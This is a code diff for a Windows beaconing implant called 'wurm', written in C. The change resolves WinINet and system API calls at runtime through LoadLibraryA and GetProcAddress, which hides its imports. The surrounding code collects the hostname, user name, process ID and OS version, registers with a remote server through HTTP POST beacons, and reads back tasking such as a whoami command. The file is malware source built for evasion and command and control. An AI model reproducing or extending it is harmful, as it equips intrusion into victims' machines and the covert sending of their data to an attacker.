@@ -4,6 +4,91 @@
 
 #define pointer_length 1
 
+typedef BOOL (WINAPI* GETCOMPUTERNAMEA)(
+    LPSTR lpBuffer,
+    LPDWORD nSize
+);
+
+typedef BOOL (WINAPI* GETUSERNAMEA)(
+    LPSTR   lpBuffer,
+    LPDWORD pcbBuffer
+);
+
+typedef DWORD (WINAPI* GETCURRENTPROCESSID)();
+
+typedef DWORD (WINAPI* GETVERSION)();
+
+typedef HINTERNET (WINAPI* INTERNETOPENA)(
+    LPCSTR lpszAgent,
+    DWORD  dwAccessType,
+    LPCSTR lpszProxy,
+    LPCSTR lpszProxyBypass,
+    DWORD  dwFlags
+);
+
+typedef HINTERNET (WINAPI* INTERNETCONNECTA)(
+    HINTERNET     hInternet,
+    LPCSTR        lpszServerName,
+    INTERNET_PORT nServerPort,
+    LPCSTR        lpszUserName,
+    LPCSTR        lpszPassword,
+    DWORD         dwService,
+    DWORD         dwFlags,
+    DWORD_PTR     dwContext
+);
+
+typedef HINTERNET (WINAPI* HTTPOPENREQUESTA)(
+    HINTERNET hConnect,
+    LPCSTR    lpszVerb,
+    LPCSTR    lpszObjectName,
+    LPCSTR    lpszVersion,
+    LPCSTR    lpszReferrer,
+    LPCSTR    *lplpszAcceptTypes,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+);
+
+typedef BOOL (WINAPI* HTTPADDREQUESTHEADERSA)(
+    HINTERNET hRequest,
+    LPCSTR    lpszHeaders,
+    DWORD     dwHeadersLength,
+    DWORD     dwModifiers
+);
+
+typedef BOOL (WINAPI* HTTPSENDREQUESTA)(
+    HINTERNET hRequest,
+    LPCSTR    lpszHeaders,
+    DWORD     dwHeadersLength,
+    LPVOID    lpOptional,
+    DWORD     dwOptionalLength
+);
+
+typedef BOOL (WINAPI* INTERNETQUERYDATAAVAILABLE)(
+    HINTERNET hFile,
+    LPDWORD   lpdwNumberOfBytesAvailable,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+);
+
+typedef BOOL (WINAPI* INTERNETREADFILE)(
+    HINTERNET hFile,
+    LPVOID    lpBuffer,
+    DWORD     dwNumberOfBytesToRead,
+    LPDWORD   lpdwNumberOfBytesRead
+);
+
+typedef BOOL (WINAPI* INTERNETCLOSEHANDLE)(
+    HINTERNET hInternet
+);
+
+typedef BOOL (WINAPI* CRYPTBINARYTOSTRINGA)(
+    const BYTE *pbBinary,
+    DWORD      cbBinary,
+    DWORD      dwFlags,
+    LPSTR      pszString, 
+    DWORD      *pcchString
+);
+
 struct {
     struct {
         char            hostname[MAX_PATH];
@@ -33,12 +118,56 @@ struct {
     } beacon;
 } wurm;
 
+struct {
+    struct {
+        struct {
+            GETCOMPUTERNAMEA            GetComputerNameA;
+            GETUSERNAMEA                GetUserNameA;
+            GETCURRENTPROCESSID         GetCurrentProcessId;
+            GETVERSION                  GetVersion;
+            INTERNETOPENA               InternetOpenA;
+            INTERNETCONNECTA            InternetConnectA;
+            HTTPOPENREQUESTA            HttpOpenRequestA;
+            HTTPADDREQUESTHEADERSA      HttpAddRequestHeadersA;
+            HTTPSENDREQUESTA            HttpSendRequestA;
+            INTERNETQUERYDATAAVAILABLE  InternetQueryDataAvailable;
+            INTERNETREADFILE            InternetReadFile;
+            INTERNETCLOSEHANDLE         InternetCloseHandle;
+            CRYPTBINARYTOSTRINGA        CryptBinaryToStringA;
+        } call;
+        struct {
+            HMODULE                     kernel32;
+            HMODULE                     advapi32;
+            HMODULE                     crypt32;
+            HMODULE                     wininet;
+        } module;
+    } win32;
+    struct {
+        struct {
+            /*
+            CALLOC                      calloc;
+            STRCAT_S                    strcat_s;
+            STRLEN                      strlen;
+            MALLOC                      malloc;
+            SPRINTF                     sprintf;
+            FREE                        free;
+            MEMSET                      memset;
+            REALLOC                     realloc;
+            ATOI                        atoi; 
+            */
+        } call;
+        struct {
+            HMODULE                     msvcrt;
+        } module;
+    } other;
+} internal;
+
 unsigned char patch_list_name[pointer_length] = {0xAA};
 
 BOOL AA$whoami(CHAR **output) {
     DWORD username_buffer = 256;
     CHAR username[256];
-    if (GetUserNameA(username, &username_buffer)) {
+    if (internal.win32.call.GetUserNameA(username, &username_buffer)) {
         *output = (CHAR*)calloc(strlen(username) + 1, sizeof(CHAR));
         strcat_s(*output, strlen(username) + 1, username);
         return TRUE;
@@ -63,19 +192,19 @@ void Register() {
     wurm.http.status = "register";
     wurm.http.format = "%s:%s,%s,%d,%d,%s";
 
-    if (GetComputerNameA(wurm.info.hostname, &hostname_length)) {
+    if (internal.win32.call.GetComputerNameA(wurm.info.hostname, &hostname_length)) {
         printf("Hostname: %s\n", wurm.info.hostname);
     }
 
-    if (GetUserNameA(wurm.info.username, &username_buffer)) {
+    if (internal.win32.call.GetUserNameA(wurm.info.username, &username_buffer)) {
         printf("Username: %s\n", wurm.info.username);
     }
 
-    if (wurm.info.pid = GetCurrentProcessId()) {
+    if (wurm.info.pid = internal.win32.call.GetCurrentProcessId()) {
         printf("Process ID: %lu\n", wurm.info.pid);
     }
 
-    if (wurm.info.version = GetVersion()) {
+    if (wurm.info.version = internal.win32.call.GetVersion()) {
         printf("Version: %lu\n", wurm.info.version);
     }
 
@@ -123,14 +252,14 @@ BOOL Request() {
     printf("Sending beacon...\n");
     wurm.beacon.count += 1;
     
-    HINTERNET hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = internal.win32.call.InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet != NULL) {
-        HINTERNET hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+        HINTERNET hConnect = internal.win32.call.InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
         if (hConnect != NULL) {
-            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
+            HINTERNET hRequest = internal.win32.call.HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
             if (hRequest != NULL) {
-                HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD);
-                HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);
+                internal.win32.call.HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD);
+                internal.win32.call.HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);
 
                 if (wurm.http.status == "output") {
                     return TRUE;
@@ -142,14 +271,14 @@ BOOL Request() {
                 while (TRUE) {
                     DWORD available_size = 0;
                     DWORD download_buffer;
-                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
+                    BOOL available = internal.win32.call.InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
                     if (!available || available_size == 0) {
                         break;
                     }
                     temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
                     memset(temp_buffer, 0, available_size + 1);
 
-                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
+                    BOOL value = internal.win32.call.InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
                     if (!value || download_buffer == 0) {
                         break;
                     }
@@ -170,13 +299,13 @@ BOOL Request() {
                 temp_buffer = NULL;
 
                 if (hRequest) {
-                    InternetCloseHandle(hRequest);
+                    internal.win32.call.InternetCloseHandle(hRequest);
                 }
                 if (hConnect) {
-                    InternetCloseHandle(hConnect);
+                    internal.win32.call.InternetCloseHandle(hConnect);
                 }
                 if (hInternet) {
-                    InternetCloseHandle(hInternet);
+                    internal.win32.call.InternetCloseHandle(hInternet);
                 }
             }
         }
@@ -244,6 +373,24 @@ int main(int argc, char* argv[]) {
 
     wurm.auth.cookie = NULL; 
     wurm.auth.keyword = "boondoggle";
+
+    internal.win32.module.kernel32 = LoadLibraryA("kernel32.dll");
+    internal.win32.module.advapi32 = LoadLibraryA("advapi32.dll");
+    internal.win32.module.wininet = LoadLibraryA("wininet.dll");
+    internal.win32.module.crypt32 = LoadLibraryA("crypt32.dll");
+
+    internal.win32.call.GetComputerNameA =              (GETCOMPUTERNAMEA)              GetProcAddress(internal.win32.module.kernel32, "GetComputerNameA");
+    internal.win32.call.GetUserNameA =                  (GETUSERNAMEA)                  GetProcAddress(internal.win32.module.advapi32, "GetUserNameA");
+    internal.win32.call.GetCurrentProcessId =           (GETCURRENTPROCESSID)           GetProcAddress(internal.win32.module.kernel32, "GetCurrentProcessId");
+    internal.win32.call.GetVersion =                    (GETVERSION)                    GetProcAddress(internal.win32.module.kernel32, "GetVersion");
+    internal.win32.call.InternetOpenA =                 (INTERNETOPENA)                 GetProcAddress(internal.win32.module.wininet, "InternetOpenA");
+    internal.win32.call.InternetConnectA =              (INTERNETCONNECTA)              GetProcAddress(internal.win32.module.wininet, "InternetConnectA");
+    internal.win32.call.HttpOpenRequestA =              (HTTPOPENREQUESTA)              GetProcAddress(internal.win32.module.wininet, "HttpOpenRequestA");
+    internal.win32.call.HttpAddRequestHeadersA =        (HTTPADDREQUESTHEADERSA)        GetProcAddress(internal.win32.module.wininet, "HttpAddRequestHeadersA");
+    internal.win32.call.HttpSendRequestA =              (HTTPSENDREQUESTA)              GetProcAddress(internal.win32.module.wininet, "HttpSendRequestA");
+    internal.win32.call.InternetQueryDataAvailable =    (INTERNETQUERYDATAAVAILABLE)    GetProcAddress(internal.win32.module.wininet, "InternetQueryDataAvailable");
+    internal.win32.call.InternetReadFile =              (INTERNETREADFILE)              GetProcAddress(internal.win32.module.wininet, "InternetReadFile");
+    internal.win32.call.InternetCloseHandle =           (INTERNETCLOSEHANDLE)           GetProcAddress(internal.win32.module.wininet, "InternetCloseHandle");
 
     Register();
 
